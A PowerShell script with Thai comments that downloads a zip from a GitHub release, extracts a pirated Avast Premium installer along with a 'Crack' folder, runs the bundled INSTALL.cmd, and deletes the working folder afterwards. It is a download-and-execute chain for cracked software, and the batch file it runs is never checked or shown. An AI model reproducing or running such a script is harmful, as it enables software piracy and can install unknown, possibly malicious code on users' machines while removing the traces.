# 1. บังคับใช้โปรโตคอลการเชื่อมต่อความเร็วสูง
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$targetPath = "C:\phwyverysad"
$zipFile = "$targetPath\avast_premium.zip"
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/avast_premium.zip"

if (!(Test-Path $targetPath)) { New-Item -ItemType Directory -Path $targetPath -Force | Out-Null }

# 2. ปิด Progress Bar ชั่วคราวเพื่อเร่งสปีด (สำคัญมาก!)
$progressPreference = 'SilentlyContinue'

Write-Host "🚀 Downloading at Max Speed..." -ForegroundColor BrightWhite -BackgroundColor DarkBlue

try {
    $webClient = New-Object System.Net.WebClient
    # ใช้ Proxy เดิมของระบบเพื่อความเร็ว
    $webClient.Proxy = [System.Net.WebRequest]::DefaultWebProxy
    $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    
    # เริ่มดาวน์โหลด (Synchronous .NET Method)
    $webClient.DownloadFile($url, $zipFile)
} catch {
    Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
    exit
} finally {
    # เปิด Progress Bar กลับมา
    $progressPreference = 'Continue'
}

Write-Host "✅ Download Finished!" -ForegroundColor Green

# 3. ส่วนที่เหลือ (Extract & Install)
Write-Host "📦 Extracting..." -ForegroundColor Yellow
Expand-Archive -Path $zipFile -DestinationPath $targetPath -Force

$itemsToMove = @("INSTALL.cmd", "avast_premium_security_offline_setup.exe", "Crack")
foreach ($itemName in $itemsToMove) {
    $sourceItem = Get-ChildItem -Path $targetPath -Filter $itemName -Recurse | Select-Object -First 1
    if ($sourceItem) { Move-Item -Path $sourceItem.FullName -Destination (Join-Path $targetPath $itemName) -Force }
}

if (Test-Path $zipFile) { Remove-Item -Path $zipFile -Force }

$cmdPath = Join-Path $targetPath "INSTALL.cmd"
if (Test-Path $cmdPath) {
    Write-Host "🛠️ Running Install..." -ForegroundColor Magenta
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$cmdPath`"" -WorkingDirectory $targetPath -Wait
}

Write-Host "🧹 Cleaning up..." -ForegroundColor Gray
Start-Sleep -Seconds 2
Remove-Item -Path $targetPath -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "✨ Done!" -ForegroundColor Green
